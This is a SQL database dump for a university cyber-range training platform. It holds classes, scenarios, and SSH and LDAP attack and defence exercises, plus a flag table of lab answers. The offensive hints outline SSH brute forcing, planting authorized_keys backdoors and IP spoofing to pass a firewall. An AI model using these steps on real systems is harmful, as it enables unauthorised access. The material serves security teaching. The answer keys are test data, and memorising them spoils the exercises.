-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: Dec 24, 2024 at 09:51 AM
-- Server version: 10.4.32-MariaDB
-- PHP Version: 8.2.12

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `cyberrange`
--

-- --------------------------------------------------------

--
-- Table structure for table `actual_answers`
--

CREATE TABLE `actual_answers` (
  `id` int(11) NOT NULL,
  `exercise_id` varchar(10) NOT NULL,
  `expected_command` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `class`
--

CREATE TABLE `class` (
  `class_name` varchar(50) NOT NULL,
  `description` text NOT NULL,
  `class_code` varchar(10) NOT NULL,
  `created_by` int(11) DEFAULT NULL,
  `is_archived` tinyint(1) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `class`
--

INSERT INTO `class` (`class_name`, `description`, `class_code`, `created_by`, `is_archived`) VALUES
('DFT2S1G5', 'DIPLOMA IN INFORMATION TECHNOLOGY - YEAR 2 SEMESTER 1 GROUP 5', 'AJE66CB', 1, 0),
('RIS3S2G5', 'BACHELOR OF INFORMATION TECHNOLOGY (HONOURS) IN INFORMATION SECURITY - YEAR 3 SEMESTER 2 GROUP 5', 'WBV68FB', 2, 0),
('RIS3S2G6', 'BACHELOR OF INFORMATION TECHNOLOGY (HONOURS) IN INFORMATION SECURITY - YEAR 3 SEMESTER 2 GROUP 6', 'MPV88RL', 2, 0),
('RIS3S2G7', 'BACHELOR OF INFORMATION TECHNOLOGY (HONOURS) IN INFORMATION SECURITY - YEAR 3 SEMESTER 2 GROUP 7', 'HVC7II6', 5, 0),
('RSD3S2G3', 'BACHELOR OF INFORMATION TECHNOLOGY (HONOURS) IN SOFTWARE SYSTEMS DEVELOPMENT - YEAR 3 SEMESTER 2 GROUP 3', '4TCIF9L', 3, 0),
('RSD3S2G5', 'BACHELOR OF INFORMATION TECHNOLOGY (HONOURS) IN SOFTWARE SYSTEMS DEVELOPMENT - YEAR 3 SEMESTER 2 GROUP 5', 'MMF9F9L', 4, 0);

-- --------------------------------------------------------

--
-- Table structure for table `class_scenarios`
--

CREATE TABLE `class_scenarios` (
  `class_name` varchar(50) NOT NULL,
  `scenario_id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `class_scenarios`
--

INSERT INTO `class_scenarios` (`class_name`, `scenario_id`) VALUES
('RIS3S2G5', 2),
('RIS3S2G7', 1),
('RIS3S2G7', 2),
('RIS3S2G7', 3),
('RIS3S2G7', 4),
('RIS3S2G7', 5);

-- --------------------------------------------------------

--
-- Table structure for table `exercise`
--

CREATE TABLE `exercise` (
  `exercise_id` varchar(10) NOT NULL,
  `title` varchar(255) NOT NULL,
  `learningObj_1` varchar(255) NOT NULL,
  `learningObj_2` varchar(255) NOT NULL,
  `learningObj_3` varchar(255) NOT NULL,
  `learningObj_4` varchar(255) NOT NULL,
  `scenarioQues` mediumtext NOT NULL,
  `question` mediumtext DEFAULT NULL,
  `duration` varchar(50) NOT NULL,
  `exerciseType` varchar(30) NOT NULL,
  `difficulty_level` varchar(30) NOT NULL,
  `hints` mediumtext NOT NULL,
  `exerciseOrder` int(10) NOT NULL,
  `link` varchar(50) NOT NULL,
  `scenario_id` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `exercise`
--

INSERT INTO `exercise` (`exercise_id`, `title`, `learningObj_1`, `learningObj_2`, `learningObj_3`, `learningObj_4`, `scenarioQues`, `question`, `duration`, `exerciseType`, `difficulty_level`, `hints`, `exerciseOrder`, `link`, `scenario_id`) VALUES
('daf', 'Testing123', 'Testing123', 'Testing123', 'Testing123', 'Testing123', '', 'Testing123', '2 minutes', 'Offensive Exercise', 'Beginner', 'Testing123', 0, 'Testing123', 3),
('ldapDA', 'Exercise A: Deny LDAP Injection', 'Understand the benefits of setting up a firewall.', 'Gain hands-on experience with deploying a firewall in Linux Server.', '-', '-', 'You are a security consultant hired by a company concerned about the security of their LDAP server. During your security audit, you discover that the LDAP packets sent is readable, which is vulnerable to interception. The company has asked you to implement defend strategies to strengthen server security.', 'Your task is to secure the LDAP server by <code>setting up a firewall so that only LDAP Client can access to LDAP Server</code>.', '10 Minutes', 'Defensive Exercise', 'Beginner', '<p><strong>A firewall can filter incoming traffic to deny any unwanted packets!</strong></p>\r\n                            <pre>By setting up a firewall, you can choose to ONLY receive packets from the client! <code style=\"font-size: 0.875em; color: var(--bs-code-color); word-wrap: break-word;\"></code></pre>', 2, 'ldapdefenda.php', 2),
('ldapDB', 'Exercise B: Encrypting LDAP Packets', 'Explore on how to encrypt a LDAP server and Client to prevent Man-in-the-middle attack', 'Gain hands-on experience on deploying encryption on LDAP request', 'Understand the benefits of encrypting packets', '-', 'You are a security consultant hired by a company concerned about the security of their LDAP server. During your security audit, you discover that the LDAP packets sent is readable, which is vulnerable to interception. The company has asked you to implement defend strategies to strengthen server security.', 'Your task is to secure the LDAP server by <code>encrypting the connection between LDAP Server and Client</code>.', '30 Minutes', 'Defensive Exercise', 'Intermediate', '<p><strong>Packets not encrypted can be intercepted using Wireshark and seen by default</strong></p>\r\n                            <pre>Explore on how to apply SSL/TLS to encrypt the connection between LDAP Server and Client<code style=\"font-size: 0.875em; color: var(--bs-code-color); word-wrap: break-word;\"></code></pre>\r\n                            <p><strong>You may need to use the preconfigured SSH connection to ceritfy the encryption</strong></p>\r\n                            <pre>scp [command]<code style=\"font-size: 0.875em; color: var(--bs-code-color); word-wrap: break-word;\"></code></pre>\r\n                            <p><strong>The Ubuntu OpenLDAP package is compiled against the GnuTLS SSL libraries, so you may use GnuTLS to generate the SSL credentials</strong></p>\r\n                            <pre>sudo apt-get install gnutls-bin ssl-cert<code style=\"font-size: 0.875em; color: var(--bs-code-color); word-wrap: break-word;\"></code></pre>', 4, 'ldapdefendb.php', 2),
('ldapOA', 'Exercise A : LDAP Injection on a LDAP Server', 'Understand the risks associated with unencrypted LDAP traffic', 'Learn how to capture and analyze LDAP traffic using tools like Wireshark.', 'Gain hands-on experience with executing LDAP queries using intercepted credentials.', 'Recognize the importance of implementing security measures such as encryption and access controls to protect directory services.', '-', 'In this exercise, you are required to <code>conduct a LDAP Injection attack</code> on an LDAP server using manual input command. You can utilize tools such as <code>Wireshark</code> to gain unauthorized access to the target machine. Your objective is to explore the process of LDAP attack by identifying valid credentials and establishing access. After your attack successful, submit your results here!\r\n                            If you cannot complete the LDAP Injection, you can still submit the username and password retrieve during the process by toggling the submission space!', '20 Minutes', 'Offensive Exercise', 'Beginner', '                            <p><strong>Identify the interface used by LDAP: </strong></p>\r\n                            <p>Pay attention to the network interface you select in Wireshark to capture the correct traffic</p>\r\n                            <p><strong>Explore LDAP commands: </strong></p>\r\n                            <p>Remember that LDAP queries can be made using simple command-line tools</p>\r\n                            <pre><code>- man ldapsearch</code></pre>', 1, 'ldapattacka.php', 2),
('ldapOB', 'Exercise B : LDAP Injection on a LDAP Server with Simple Firewall', 'Recognize the weakness of implementing security measures that is too simple such as basic firewall.', 'Learn how to overcome firewall that is not carefully planned.', '', '', '-', 'In this exercise, you are required to <code>conduct a LDAP Injection attack</code> on an LDAP server using manual input command. It is different with <code>Exercise A</code> as it has already applied some simple firewall rules you have completed in <code>Defensive Exercise A</code>. Your objective is to explore the process of overcoming the security measure. After your attack successful, submit the new flag.', '20 Minutes', 'Offensive Exercise', 'Beginner', '                            <p><strong>Identify the source IP address of the LDAP Client</strong></p>\r\n                            <p>Check again the packet you captured in Wireshark</p>\r\n                            <p><strong>Change the IP address of Kali Linux into the same as the LDAP Client</strong></p>\r\n                            <p>If the LDAP Client can connect to the Server, why not try the same IP? Try using ip addr command to temporary add a IP address</p>\r\n                            <pre><code>- ip addr add [ip-address] dev [interface-name]</code></pre>', 3, 'ldapattackb.php', 2),
('sshDA', 'Exercise A: Disable SSH Password Authentication', 'Understand the benefits of SSH key-based authentication over password-based methods.', 'Learn how to modify SSH server configurations to enforce key-based access.', 'Gain hands-on experience with securing an SSH server against brute force attacks.', '-', 'You are a security consultant hired by a company concerned about the security of their SSH server. During your security audit, you discover that the server allows password-based authentication, which is vulnerable to brute force attacks. The company has asked you to implement key-based authentication to strengthen server security.', 'Your task is to secure the SSH server by <code>disabling password-based authentication</code>. This requires you to modify the SSH configuration file to ensure that only users with a valid SSH key pair can log in. After making these changes, confirm that password-based login is disabled and that key-based login works as expected. Remember to remove <code>#</code> if necessary.', '10 Minutes', 'Defensive Exercise', 'Beginner', '<p><strong>Edit the SSH configuration file using your preferred text editor.</strong></p>\r\n                            <pre>For example, issue command <code style=\"font-size: 0.875em; color: var(--bs-code-color); word-wrap: break-word;\">nano &lt;pathname&gt;</code></pre>\r\n                            <p><strong>Review the configuration settings in the SSH configuration file.</strong></p>\r\n                            <pre>Change the value of <code style=\"font-size: 0.875em; color: var(--bs-code-color); word-wrap: break-word;\">PasswordAuthentication</code></pre>\r\n                            <p><strong>Reload the SSH service to apply the changes</strong></p>\r\n                            <pre>For example, issue command <code style=\"font-size: 0.875em; color: var(--bs-code-color); word-wrap: break-word;\">sudo systemctl reload ssh</code></pre>', 5, 'sshDefendA.php', 1),
('sshDB', 'Exercise B: Limit Maximum Number of SSH Authentication Attempts', 'Understand the importance of limiting failed SSH authentication attempts to protect against brute force attacks.', 'Gain hands-on experience with configuring SSH server settings to prevent excessive login attempts.', 'Learn how to test and verify the effectiveness of authentication attempt limits.', '-', 'As part of your role in securing an organization’s SSH server, you discover that there is no limit on the number of failed login attempts. This lack of restriction makes the server vulnerable to brute force attacks. To mitigate this risk, the organization wants the server to automatically terminate connections after a few failed login attempts.', 'Your task is to configure the SSH server to <code>limit failed login attempts</code> to a maximum of <code>3</code>. Remember to remove <code>#</code> if nessessary. Once configured, verify that the setting is effective by testing with multiple failed login attempts. This measure should reduce the risk of brute force attacks and unauthorized access.', '10 Minutes', 'Defensive Exercise', 'Beginner', '<p><strong>Edit the SSH configuration file using your preferred text editor.</strong></p>\r\n                            <pre>For example, issue command <code style=\"font-size: 0.875em; color: var(--bs-code-color); word-wrap: break-word;\">nano &lt;pathname&gt;</code></pre>\r\n                            <p><strong>Review the configuration settings in the SSH configuration file.</strong></p>\r\n                            <pre>Set a value for <code style=\"font-size: 0.875em; color: var(--bs-code-color); word-wrap: break-word;\">MaxAuthTries</code></pre>\r\n                            <p><strong>Reload the SSH service to apply the changes</strong></p>\r\n                            <pre>For example, issue command <code style=\"font-size: 0.875em; color: var(--bs-code-color); word-wrap: break-word;\">sudo systemctl reload ssh</code></pre>', 6, 'sshDefendB.php', 1),
('sshDC', 'Exercise C: Implement Fail2ban Intrusion Prevention Tool', 'Understand the use of Fail2ban as a defense mechanism against SSH brute force attacks.', 'Gain experience configuring Fail2ban to automatically detect and block suspicious IPs.', 'Learn to set up alerts and whitelist trusted IPs to enhance SSH security without impacting trusted users.', '', 'The company’s SSH server has experienced multiple unauthorized login attempts originating from various IP addresses. To secure the server, you have been assigned to implement Fail2ban, an intrusion prevention tool that can automatically detect and block IPs showing suspicious behavior, such as repeated failed login attempts within a short period.', 'Install and configure <code>Fail2ban</code> on the SSH server to monitor failed login attempts. Set it to ban any IP address with <code>3 failed login attempts</code> within a <code>1-minute period</code>. Set the <code>ban duration for 24 hours</code> to prevent persistent brute-force attacks. Further configurations can be added by yourself to enhance the security.', '20 Minutes', 'Defensive Exercise', 'Advanced', '<p><strong>Install Fail2Ban:</strong></p>\r\n                            <p>Remember to update your packages and install fail2ban:</p>\r\n                            <pre><code>sudo apt update</code></pre>\r\n                            <pre><code>apt-get install fail2ban -y</code></pre>\r\n\r\n                            <p><strong>Create the Configuration File:</strong></p>\r\n                            <p>Instead of editing the default configuration <code>/etc/fail2ban/jail.conf</code>, create\r\n                                a local override file for customization. This way, updates won’t overwrite your changes:\r\n                            </p>\r\n                            <pre><code>sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local</code></pre>\r\n\r\n                            <p><strong>Enable Fail2ban to start on boot:</strong></p>\r\n                            <pre><code>sudo systemctl enable --now fail2ban </code></pre>\r\n\r\n                            <p>Check current status of the Fail2ban service:</p>\r\n                            <pre><code>sudo systemctl status -l fail2ban </code></pre>\r\n\r\n                            <p><strong>Configure and Edit SSH Jail Configuration:</strong></p>\r\n                            <p>Open the Fail2ban configuration file for SSH jail settings:</p>\r\n                            <pre><code>sudo nano /etc/fail2ban/jail.local</code></pre>\r\n\r\n                            <p><strong>Additional info:</strong></p>\r\n                            <p>Review the log file (monitoring Fail2ban\'s actions):</p>\r\n                            <pre><code>sudo tail -f /var/log/fail2ban.log</code></pre>\r\n                            <p>See if any IPs have been banned:</p>\r\n                            <pre><code>sudo fail2ban-client status sshd</code></pre>\r\n                            <p>Unblock a banned IP address:</p>\r\n                            <pre><code>sudo fail2ban-client unban &lt;ip_address&gt;</code></pre>', 7, 'sshDefendC.php', 1),
('sshOA1', 'Exercise A (i): Brute forcing SSH Using Command-line Tools', 'Understand the basics of SSH brute force attacks.', 'Gain experience with different SSH brute force tools like Metasploit, Hydra, Patator, and Medusa.', 'Learn how to configure and execute manual SSH brute force attack with commands.', 'Understand the implications of SSH vulnerabilities on system security.', '-', 'In this exercise, you are required to <code>conduct a brute force attack</code> on an SSH server using manual input command. You can utilize tools such as <code>Hydra</code> and <code>Metasploit</code> to gain unauthorized access to the target machine. Your objective is to explore the process of brute forcing by identifying valid credentials and establishing access. After you brute force successful, submit your results here!', '20 Minutes', 'Offensive Exercise', 'Beginner', ' <p><strong>Use Nmap to Identify Targets:</strong></p>\r\n                            <p>Start by scanning your network to identify which hosts have port 22 (SSH) open.<br>\r\n                                For example, use the following command to discover active hosts with SSH open:</p>\r\n                            <pre><code>nmap &lt;network_address&gt; -p 22 --open</code></pre>\r\n                            <p><strong>Make Use of Possible Username and Password Lists:</strong></p>\r\n                            <p>Utilize the provided lists of potential usernames and passwords to use for brute force attacks.<br>\r\n                                Example commands:</p>\r\n                            <pre><code>cat > users.txt</code></pre>\r\n                            <pre><code>cat > passwords.txt</code></pre>\r\n                            <p><strong>If using Metasploit Framework:</strong></p>\r\n                            <p>Once in the Metasploit console, load the SSH login module:</p>\r\n                            <pre><code>use auxiliary/scanner/ssh/ssh_login</code></pre>', 1, 'sshAttackAi.php', 1),
('sshOA2', 'Exercise A (ii): Creating Backdoor Using SSH key-based authentication', 'Learn how to establish persistent access to a compromised system through OpenSSH.', 'Gain hands-on experience in configuring SSH key-based authentication to create a secure backdoor.', 'Understand the importance of persistence in real-world cyber attacks and the methods used to maintain access.', 'Explore the implications of backdoor access on system security and the potential risks associated with SSH vulnerabilities.', '-', 'In this continuation exercise, you will build upon your success in conducting a brute force attack on the SSH server. Your task is to establish persistence by <code>configuring remote access</code> through <code>OpenSSH</code>. You need to use the <code>ssh-keygen</code> command to generate an SSH key pair, allowing you to create a backdoor on the target system. Through this hands-on experience, you will gain insights into the techniques used by attackers to ensure ongoing access to their targets.', '20 Minutes', 'Offensive Exercise', 'Beginner', ' <p><strong>Set Up the Backdoor with SSH Key Authentication:</strong></p>\r\n                                <p>After gaining access, copy your public key to the target machine to establish persistent access. Since SSH supports various authentication mechanisms, we\'ll focus on key-based authentication.<br>\r\n                                Generate your SSH key pair on the attacker machine:</p>\r\n                                <pre><code>ssh-keygen -t rsa</code></pre>\r\n                                <p><code>OR</code></p>\r\n                                <pre><code>ssh-keygen -t dsa</code></pre>\r\n\r\n                                <p><strong>View your public key:</strong></p>\r\n                                <pre><code>cat /.ssh/id_rsa.pub</code></pre>\r\n\r\n                                <p>Copy this public key for use on the target machine.</p>\r\n                                <p><strong>Create .ssh Directory on the Target and Paste Your Public Key:</strong></p>\r\n                                <p>On the target machine, create the necessary directories and paste your public key.<br>\r\n                                Command to create the directory:</p>\r\n                                <pre><code>mkdir -p ~/.ssh</code></pre>\r\n                                <p>Paste your public key in the victim’s machine in <code>/.ssh/authorized_keys</code>:</p>\r\n                                <pre><code>echo \"&lt;PasteYourPublicKeyHere&gt;\" >> ~/.ssh/authorized_keys</code></pre>\r\n                                <p><code>OR</code></p>\r\n                                <pre><code>scp authorized_keys &lt;ip_address&gt;:/.ssh/authorized_keys</code></pre>\r\n\r\n                                <p><strong>SSH Into the Target Without a Password:</strong></p>\r\n                                <p>With your public key in place, you should be able to SSH into the target machine without needing a password from your attacker machine.<br>\r\n                                For example, you can SSH into the target machine by:</p>\r\n                                <pre><code>ssh -i ~/.ssh/id_rsa TargetHostName@TargetHostIP</code></pre>\r\n                                <p><code>OR</code></p>\r\n                                <pre><code>ssh TargetHostName@TargetHostIP</code></pre>', 2, 'sshAttackAii.php', 1),
('sshOB1', 'Exercise B (i): Automating SSH Brute Force Attack', 'Understand the fundamentals of automating SSH brute force attacks.', 'Gain hands-on experience with Python scripting to perform brute force attacks.', 'Explore common libraries for automation such as asyncssh, paramiko, and termcolor.', 'Learn to implement automated scripts for identifying valid SSH login credentials.', '-', 'In this exercise, you are required to <code>automate a brute force attack</code> on an SSH server using a <code>Python script</code>. Write your own script or modify an existing one to systematically attempt login credentials until access is granted. Utilize libraries like asyncssh and termcolor to enhance the functionality and readability of your script. Once access is achieved, submit your findings here.', '30 Minutes', 'Offensive Exercise', 'Advanced', ' <p><strong>Use Nmap to Identify Targets:</strong></p>\r\n                                <p>Start by scanning your network to identify which hosts have port 22 (SSH) open.<br>\r\n                                For example, use the following command to discover active hosts with SSH open:</p>\r\n                                <pre><code>nmap &lt;network_address&gt; -p 22 --open</code></pre>\r\n                                <p><strong>Make Use of Possible Username and Password Lists:</strong></p>\r\n                                <p>Utilize the provided lists of potential usernames and passwords to use for brute force attacks.<br>\r\n                                Example commands:</p>\r\n                                <pre><code>cat > users.txt</code></pre>\r\n                                <pre><code>cat > passwords.txt</code></pre>\r\n                                <p><strong>If using Metasploit Framework:</strong></p>\r\n                                <p>Once in the Metasploit console, load the SSH login module:</p>\r\n                                <pre><code>use auxiliary/scanner/ssh/ssh_login</code></pre>\r\n                                <p><strong>To automate the brute force attack using the provided Python script:</strong></p>\r\n                                <p>Install necessary Python libraries:</p>\r\n                                <pre><code>Install necessary Python libraries</code></pre>\r\n                                <p>Execute the script to perform the brute force attack:</p>\r\n                                <pre><code>python async-ssh-bruteforcer.py &lt;target-ip&gt; -u &lt;username&gt; -w &lt;wordlist&gt; -p &lt;port&gt;</code></pre>', 3, 'sshAttackBi.php', 1),
('sshOB2', 'Exercise B (ii): Creating Backdoor Using Reverse SSH Tunnel', 'Understand the concept of reverse SSH tunneling and how it can be used to maintain persistence.', 'Gain experience in configuring SSH tunnels for remote access on compromised systems.', 'Learn techniques for establishing a backdoor in a secured environment.', 'Explore the ethical and defensive implications of persistent access techniques.', '-', 'In this advanced exercise, after successfully brute-forcing the SSH login credentials, you are required to create a backdoor by <code>setting up a reverse SSH tunnel</code> from the compromised server to your attack machine. Due to firewall restrictions, external connections to internal machines are blocked, which would typically prevent direct access. However, we can bypass this limitation using an <code>SSH port forwarding tunnel</code>, commonly used by system administrators to access servers externally in a secure manner. By establishing a reverse SSH tunnel, you can initiate a secure connection from the compromised server back to your machine, enabling persistent access through an encrypted channel despite firewall restrictions.This tunnel will simulate persistence, enabling future access to the compromised system.', '20 minutes', 'Offensive Exercise', 'Advanced', ' <p><strong>Use Nmap to Identify Targets:</strong></p>\r\n                                <p>Start by scanning your network to identify which hosts have port 22 (SSH) open.<br>\r\n                                For example, use the following command to discover active hosts with SSH open:</p>\r\n                                <pre><code>nmap 192.168.43.0/24 -p 22 --open</code></pre>\r\n\r\n                                <p><strong>Prepare Username and Password Lists:</strong></p>\r\n                                <p>Create your lists of potential usernames and passwords to use for brute force attacks.<br>\r\n                                Example commands:</p>\r\n                                <pre><code>cat > users.txt</code></pre>\r\n                                <pre><code>cat > passwords.txt</code></pre>\r\n\r\n                                <p><strong>Set Up the Backdoor with SSH Key Authentication:</strong></p>\r\n                                <p>After gaining access, copy your public key to the target machine to establish persistent access. Since SSH supports various authentication mechanisms, we\'ll focus on key-based authentication.<br>\r\n                                Generate your SSH key pair on the attacker machine:</p>\r\n                                <pre><code>ssh-keygen -t rsa -b 2048 -f /.ssh/id_rsa</code></pre>\r\n\r\n                                <p>View your public key:</p>\r\n                                <pre><code>cat ~/.ssh/id_rsa.pub</code></pre>\r\n\r\n                                <p>Copy this public key for use on the target machine.</p>\r\n                                <p><strong>Create .ssh Directory on the Target and Paste Your Public Key:</strong></p>\r\n                                <p>On the target machine, create the necessary directories and paste your public key.<br>\r\n                                Command to create the directory:</p>\r\n                                <pre><code>mkdir -p ~/.ssh</code></pre>\r\n                                <p>Remember to change the directory and file permissions to ensure authentication succeeds:</p>\r\n                                <pre><code>chmod 700 ~/.ssh</code></pre>\r\n                                <p>Paste your public key in the victim’s machine in <code>/.ssh/authorized_keys</code>:</p>\r\n                                <pre><code>echo \"&lt;PasteYourPublicKeyHere&gt;\" >> ~/.ssh/authorized_keys</code></pre>\r\n\r\n                                <p><strong>SSH Into the Target Without a Password:</strong></p>\r\n                                <p>With your public key in place, you should be able to SSH into the target machine without needing a password from your attacker machine.<br>\r\n                                For example, you can SSH into the target machine by:</p>\r\n                                <pre><code>ssh -i ~/.ssh/id_rsa TargetHostName@TargetHostIP</code></pre>\r\n                                <p>or</p>\r\n                                <pre><code>ssh TargetHostName@TargetHostIP</code></pre>', 4, 'sshAttackBii.php', 1),
('t001', 'Exploitation of Active Directory', 'Testing123', 'Testing123', 'Testing123', 'Testing123', '', NULL, '10 minutes', '', 'Beginner', '', 0, '', 3),
('t002', 'Exploitation of Remote Desktop Protocol (RDP)', 'Testing123', 'Testing123', '0', 'Testing123', '', 'Testin123', '5 minutes', 'Offensive Exercise', 'Intermediate', '', 0, 'Testin123', 4),
('t003', 'Cross-Site Scripting (XSS) Attacks and Defenses', 'Testing123', 'Testing123', 'Testing123', 'Testing123', '', 'Testin123', '15 minutes', 'Offensive Exercise', 'Beginner', 'Testin123', 0, 'Testin123', 5),
('t004', 'Testing123', 'Testing123', 'Testing123', 'Testing123', 'Testing123', '', NULL, '2 minutes', 'Practical', 'Intermediate', '', 0, '', 3),
('t005', 'Testing123', 'Testing123', 'Testing123', 'Testing123', 'Testing123', '', NULL, '1 minutes', 'Offensive Exercise', 'Beginner', 'Testing123', 0, 'Testing123', 3);

-- --------------------------------------------------------

--
-- Table structure for table `exercise_ratings`
--

CREATE TABLE `exercise_ratings` (
  `rating_id` int(11) NOT NULL,
  `student_id` int(11) NOT NULL,
  `exercise_id` varchar(10) NOT NULL,
  `part_a_rating` int(11) NOT NULL,
  `part_b_rating` int(11) NOT NULL,
  `part_c_rating` int(11) NOT NULL,
  `feedback` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `flag`
--

CREATE TABLE `flag` (
  `flag_id` varchar(10) NOT NULL,
  `flag_name` varchar(255) NOT NULL,
  `flag_value` text DEFAULT NULL,
  `exercise_id` varchar(10) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `flag`
--

INSERT INTO `flag` (`flag_id`, `flag_name`, `flag_value`, `exercise_id`) VALUES
('fDA', 'pathname', '/etc/ssh/sshd_config', 'sshDA'),
('fDB1', 'pathname', '/etc/ssh/sshd_config', 'sshDB'),
('fDB2', 'MaxAuthTries', '3', 'sshDB'),
('fDC1', 'maxretry', '3', 'sshDC'),
('fDC2', 'bantime', '24h', 'sshDC'),
('fDC3', 'findtime', '1m', 'sshDC'),
('fldapDA1', 'command', 'iptables', 'ldapDA'),
('fldapDA2', 'ports', '389/636', 'ldapDA'),
('fldapDA3', 'ip', '192.168.136.134', 'ldapDA'),
('fldapDB1', 'dir', '/etc/ssl', 'ldapDB'),
('fldapDB2', 'result', 'anonymous', 'ldapDB'),
('fldapOA1', 'username', 'aaa', 'ldapOA'),
('fldapOA2', 'password', 'password', 'ldapOA'),
('fldapOB', 'flag', 'flag{this_is_the_flag}', 'ldapOA'),
('fldapOC', 'flag', 'ip addr add 192.168.136.134 dev eth0', 'ldapOB'),
('fOA1', 'username', 'yiyangtan', 'sshOA1'),
('fOA2', 'password', 'kali', 'sshOA1'),
('fOA3', 'passcode', 'successViaPubKey666', 'sshOA2'),
('fOB1', 'username', 'yiyangtan', 'sshOB1'),
('fOB2', 'password', 'kali', 'sshOB1'),
('fOB3', 'passcode', 'successViaPubKey666', 'sshOB2');

-- --------------------------------------------------------

--
-- Table structure for table `instructors`
--

CREATE TABLE `instructors` (
  `id` int(11) NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `instructor_id` varchar(50) NOT NULL,
  `faculty` varchar(150) DEFAULT NULL,
  `is_archived` tinyint(1) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `instructors`
--

INSERT INTO `instructors` (`id`, `user_id`, `instructor_id`, `faculty`, `is_archived`) VALUES
(1, 2, 'F1234', 'Faculty of Computing And Information Technology (FOCS)', 0),
(2, 8, 'F5678', 'Faculty of Computing And Information Technology (FOCS)', 0),
(3, 19, 'F1368', 'Faculty of Computing And Information Technology (FOCS)', 0),
(4, 20, 'F2888', 'Faculty of Computing And Information Technology (FOCS)', 0),
(5, 21, 'F2628', 'Faculty of Computing And Information Technology (FOCS)', 0);

-- --------------------------------------------------------

--
-- Table structure for table `instructor_classes`
--

CREATE TABLE `instructor_classes` (
  `instructor_id` int(11) NOT NULL,
  `class_name` varchar(50) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `instructor_classes`
--

INSERT INTO `instructor_classes` (`instructor_id`, `class_name`) VALUES
(1, 'DFT2S1G5'),
(2, 'RIS3S2G5'),
(2, 'RIS3S2G6'),
(3, 'RSD3S2G3'),
(4, 'RSD3S2G5'),
(5, 'RIS3S2G7');

-- --------------------------------------------------------

--
-- Table structure for table `password_resets`
--

CREATE TABLE `password_resets` (
  `email` varchar(255) NOT NULL,
  `otp` varchar(6) NOT NULL,
  `expiry` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `roles`
--

CREATE TABLE `roles` (
  `id` int(11) NOT NULL,
  `role_name` varchar(50) NOT NULL,
  `description` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `roles`
--

INSERT INTO `roles` (`id`, `role_name`, `description`) VALUES
(1, 'student', NULL),
(2, 'instructor', NULL),
(3, 'admin', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `scenario`
--

CREATE TABLE `scenario` (
  `scenario_id` int(11) NOT NULL,
  `title` varchar(255) NOT NULL,
  `description` text DEFAULT NULL,
  `instructor_id` int(11) DEFAULT NULL,
  `assigned_date` date NOT NULL DEFAULT curdate(),
  `due_date` date NOT NULL,
  `deleted_at` date NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `scenario`
--

INSERT INTO `scenario` (`scenario_id`, `title`, `description`, `instructor_id`, `assigned_date`, `due_date`, `deleted_at`) VALUES
(1, 'Exploitation of SSH (Secure Shell) Protocol', 'Learn about various SSH attacks and how to mitigate them.', 1, '2024-11-01', '2024-12-25', '0000-00-00'),
(2, 'Exploitation of Lightweight Directory Access Protocol (LDAP) Protocol', 'Learn about various LDAP attacks and how to mitigate them.', 2, '2024-11-01', '2024-12-18', '0000-00-00'),
(3, 'Exploitation of Active Directory', 'Learn about various Active Directory attacks and how to mitigate them.', 3, '2024-11-28', '2024-11-29', '0000-00-00'),
(4, 'Exploitation of Remote Desktop Protocol (RDP)', 'Learn about various Remote Desktop Protocol (RDP)', 4, '2024-11-13', '2024-11-27', '0000-00-00'),
(5, 'Cross-Site Scripting (XSS) Attacks and Defenses', 'Learn about various Cross-Site Scripting (XSS) Attacks and Defenses', 5, '2024-11-16', '2024-11-30', '0000-00-00');

-- --------------------------------------------------------

--
-- Table structure for table `scenario_ratings`
--

CREATE TABLE `scenario_ratings` (
  `rating_id` int(11) NOT NULL,
  `student_id` int(11) NOT NULL,
  `scenario_id` int(11) NOT NULL,
  `part_a_rating` int(11) NOT NULL,
  `part_b_rating` int(11) NOT NULL,
  `part_c_rating` int(11) NOT NULL,
  `feedback` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `scenario_ratings`
--

INSERT INTO `scenario_ratings` (`rating_id`, `student_id`, `scenario_id`, `part_a_rating`, `part_b_rating`, `part_c_rating`, `feedback`) VALUES
(1, 1, 1, 30, 30, 50, ''),
(2, 1, 2, 26, 22, 40, ''),
(3, 1, 3, 24, 16, 26, ''),
